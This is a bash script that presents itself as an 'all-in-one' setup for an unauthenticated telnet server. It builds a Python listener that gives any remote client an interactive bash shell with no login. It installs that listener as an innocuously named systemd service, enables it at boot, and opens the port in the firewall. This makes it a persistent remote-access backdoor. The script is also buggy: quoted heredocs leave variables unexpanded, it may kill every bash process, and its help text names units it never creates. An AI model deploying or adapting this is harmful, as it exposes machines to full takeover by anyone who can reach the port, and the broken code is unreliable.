#!/bin/bash

# ============================================================
#  Unauthenticated Telnet Server - ALL-IN-ONE SETUP SCRIPT
# ============================================================

# Configuration
PORT=${1:-2344}
PIDFILE="/var/run/NetworkServer.pid"
SERVICE_NAME="NetworkServer"
SOCKET_NAME="${SERVICE_NAME}.socket"
WRAPPER_SCRIPT="/usr/local/bin/NetworkWrapper.sh"
PYTHON_SCRIPT="/tmp/py_$(date +%s).py"

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "\n${GREEN}===  Unauthenticated Telnet Server - All-In-One Setup  ===${NC}"
echo "Config Port: ${PORT}"
echo "PID File:    ${PIDFILE}"
echo "Wrapper:     ${WRAPPER_SCRIPT}"
echo "Date:        $(date '+%F %T')"

# ============================================================
#  1. Cleanup Existing Process
# ============================================================
echo -e "\n${BLUE}=== 1. Cleanup ===${NC}"
if ss -tlnp 2>/dev/null | grep -q ":${PORT}"; then
    echo -e "${YELLOW}Warning: Port ${PORT} already in use!${NC}"
    echo "Existing processes:"
    ss -tlnp | grep ":${PORT}"
    
    read -p "Kill existing process and restart? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        pkill -f "${PORT}" 2>/dev/null || pkill -f "bash" 2>/dev/null || true
        sleep 1
    else
        echo -e "${RED}Cancelled.${NC}"
        exit 1
    fi
fi

# ============================================================
#  2. Create Wrapper Script (Persistent Management)
# ============================================================
echo -e "\n${BLUE}=== 2. Create Wrapper Script ===${NC}"
if [[ ! -f "$WRAPPER_SCRIPT" ]]; then
    cat > "$WRAPPER_SCRIPT" << 'WRAPPER_EOF'
#!/bin/bash
# Wrapper script for unauthenticated telnet server
# Runs the Python server and manages PID file

# KEY FIX: Get port from argument, default to 2344
PORT=${1:-2344}
PIDFILE="${PIDFILE}"

# Create Python server script
PYFILE="/tmp/py_$(date +%s).py"

# Build Python code line-by-line (ensures variable expansion)
echo "import socket" > "$PYFILE"
echo "import subprocess" >> "$PYFILE"
echo "" >> "$PYFILE"
echo "HOST = \"0.0.0.0\"" >> "$PYFILE"
echo "PORT = ${PORT}" >> "$PYFILE"  # This line gets: PORT = 2344
echo "" >> "$PYFILE"
echo "print(f'[OK] Python Telnet Server Starting...')" >> "$PYFILE"
echo "print(f'[OK] Listening on {HOST}:{PORT}')" >> "$PYFILE"
echo "" >> "$PYFILE"
echo "sock = socket.socket()" >> "$PYFILE"
echo "sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)" >> "$PYFILE"
echo "sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)" >> "$PYFILE"
echo "sock.bind((HOST, PORT))" >> "$PYFILE"
echo "sock.listen(5)" >> "$PYFILE"
echo "" >> "$PYFILE"
echo "while True:" >> "$PYFILE"
echo "    try:" >> "$PYFILE"
echo "        conn, addr = sock.accept()" >> "$PYFILE"
echo "        print(f'[OK] ACCEPTED: {addr}')" >> "$PYFILE"
echo "        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)" >> "$PYFILE"
echo "        subprocess.Popen(['bash', '-i'], stdin=conn, stdout=conn, stderr=conn, bufsize=1).wait()" >> "$PYFILE"
echo "        conn.close()" >> "$PYFILE"
echo "    except KeyboardInterrupt:" >> "$PYFILE"
echo "        print('[OK] Stopping...')" >> "$PYFILE"
echo "        break" >> "$PYFILE"
echo "    except Exception as e:" >> "$PYFILE"
echo "        print(f'[WARN] Error: {e}')" >> "$PYFILE"
echo "        break" >> "$PYFILE"

# Capture and store PID
python3 "$PYFILE" &
python_pid=$!
echo ${python_pid} > ${PIDFILE}

echo "[OK] Python PID: ${python_pid}"
echo "[OK] PID File: ${PIDFILE}"

# Keep wrapper alive
while true; do sleep 1; done
WRAPPER_EOF

    chmod +x "$WRAPPER_SCRIPT"
    echo -e "${GREEN}Created: ${WRAPPER_SCRIPT}${NC}"
else
    echo -e "${GREEN}Wrapper already exists: ${WRAPPER_SCRIPT}${NC}"
fi

# ============================================================
#  3. Create Systemd Service Unit File
# ============================================================
echo -e "\n${BLUE}=== 3. Create Systemd Service ===${NC}"
SYSTEMD_DIR="/etc/systemd/system"

# Create directory if needed
if [[ ! -d "$SYSTEMD_DIR" ]]; then
    sudo mkdir -p "$SYSTEMD_DIR"
    echo -e "${GREEN}Created directory: ${SYSTEMD_DIR}${NC}"
fi

# Create service file
SERVICE_FILE="${SYSTEMD_DIR}/${SERVICE_NAME}.service"
cat > "$SERVICE_FILE" << 'SERVICE_EOF'
[Unit]
Description=Network Server on Port "${PORT}"
After=network.target

[Service]
Type=simple
ExecStart="${WRAPPER_SCRIPT}" "${PORT}"
PIDFile="${PIDFILE}"
Restart=on-failure
RestartSec=5
WorkingDirectory=/
StandardOutput=journal
StandardError=journal
KillSignal=SIGINT
KillMode=process

[Install]
WantedBy=multi-user.target
SERVICE_EOF

echo -e "${GREEN}Created: ${SERVICE_FILE}${NC}"

# ============================================================
#  4. Create Systemd Socket Unit File (Network Activation)
# ============================================================
echo -e "\n${BLUE}=== 4. Create Systemd Socket ===${NC}"
SOCKET_FILE="${SYSTEMD_DIR}/${SOCKET_NAME}"

cat > "$SOCKET_FILE" << 'SOCKET_EOF'
[Unit]
Description=Network Server

[Socket]
ListenStream="${PORT}"
Accept=yes
Backlog=128
ReuseAddress=yes
KeepAlive=yes
KeepAliveTimeSec=60
FreeBind=yes
NoDelay=yes

# Trigger the service when connection arrives
ExecStartPost="${WRAPPER_SCRIPT}" "${PORT}"
Type=notify

StandardOutput=journal
StandardError=journal


[Install]
WantedBy=sockets.target
SOCKET_EOF

echo -e "${GREEN}Created: ${SOCKET_FILE}${NC}"

# ============================================================
#  5. Create Firewall Rules
# ============================================================
echo -e "\n${BLUE}=== 5. Configure Firewall ===${NC}"

# Check firewall type
if command -v ufw &> /dev/null; then
    sudo ufw allow "${PORT}"/tcp
    echo -e "${GREEN}Firewall (ufw) configured.${NC}"
    sudo ufw reload
    echo -e "${GREEN}Reloaded: ${NC}"
elif command -v firewall-cmd &> /dev/null; then
    sudo firewall-cmd --add-port="${PORT}"/tcp --permanent
    sudo firewall-cmd --reload
    echo -e "${GREEN}Firewall (firewalld) configured.${NC}"
elif command -v iptables &> /dev/null; then
    sudo iptables -A INPUT -p tcp --dport "${PORT}" -j ACCEPT
    sudo iptables-save | grep "${PORT}" > /dev/null
    echo -e "${GREEN}Firewall (iptables) configured.${NC}"
else
    echo -e "${YELLOW}Warning: No firewall detected. Check manually!${NC}"
fi

# ============================================================
#  6. Run Systemd Daemon-Reload and Start
# ============================================================
echo -e "\n${BLUE}=== 6. Start Systemd Service ===${NC}"

# Reload systemd to pick up new units
sudo systemctl daemon-reload
echo -e "${GREEN}Reloaded systemd daemon.${NC}"

# Start the socket service (which will activate the service on first connection)
sudo systemctl start "${SOCKET_NAME}"
echo -e "${GREEN}Started socket: ${SOCKET_NAME}${NC}"

# Start the service (in case of direct connections)
sudo systemctl start "${SERVICE_NAME}"
echo -e "${GREEN}Started service: ${SERVICE_NAME}${NC}"

# Enable on boot
sudo systemctl enable "${SOCKET_NAME}" 2>/dev/null || echo -e "${YELLOW}Socket enable skipped${NC}"
sudo systemctl enable "${SERVICE_NAME}" 2>/dev/null || echo -e "${YELLOW}Service enable skipped${NC}"

# ============================================================
#  7. Verify Status
# ============================================================
echo -e "\n${BLUE}=== 7. Verify Status ===${NC}"

# Check listening port
if ss -tlnp | grep -q ":${PORT}"; then
    echo -e "${GREEN} Server is listening on port ${PORT}${NC}"
    ss -tlnp | grep ":${PORT}"
else
    echo -e "${YELLOW} Server might not be listening yet...${NC}"
    echo "Checking systemd status..."
    sudo systemctl status "${SERVICE_NAME}" 2>/dev/null || echo -e "${YELLOW}service status check skipped${NC}"
fi

# Check systemd status
echo -e "\nSystemd Status:"
sudo systemctl status "${SERVICE_NAME}" 2>/dev/null || echo -e "${YELLOW}service status check skipped${NC}"

# Show PID
if [[ -f "$PIDFILE" ]]; then
    PY_PID=$(cat "$PIDFILE" 2>/dev/null)
    if [[ -n "$PY_PID" ]]; then
        echo -e "${GREEN}Process PID: ${PY_PID}${NC}"
        if ps -p "$PY_PID" &> /dev/null; then
            echo -e "${GREEN} Process is running!${NC}"
        else
            echo -e "${RED} Process died. Restarting...${NC}"
            sudo systemctl restart "${SERVICE_NAME}" 2>/dev/null || echo -e "${YELLOW}Restart skipped${NC}"
        fi
    fi
else
    echo -e "${YELLOW}PID File not found. May not be using systemd.${NC}"
fi

# ============================================================
#  8. Test Connection
# ============================================================
echo -e "\n${BLUE}=== 8. Test Connection (Local) ===${NC}"
echo "Testing with netcat..."

if command -v nc &> /dev/null; then
    echo -e "${YELLOW}Running test connection...${NC}"
    # Run test with timeout
    timeout 3 echo "whoami" | nc -v 127.0.0.1 ${PORT} -w 1 2>&1
    echo -e "${GREEN} Test completed.${NC}"
else
    echo -e "${YELLOW}netcat not found.${NC}"
fi

echo -e "\n${GREEN}===  Server Setup Complete! ===${NC}"
echo "Local Test:"
echo "  nc -v 127.0.0.1 ${PORT}"
echo "External Test (replace IP):"
echo "  nc -v <YOUR_SERVER_IP> ${PORT}"
echo "Systemd Commands:"
echo "  sudo systemctl start telnet-2344"
echo "  sudo systemctl stop telnet-2344"
echo "  sudo systemctl restart telnet-2344"
echo "  sudo systemctl status telnet-2344"
echo "  cat /var/run/telnet-2344.pid"
echo -e "\nPress Ctrl+C to stop (or use systemctl stop)"

# Keep script alive while server runs
while true; do sleep 1; done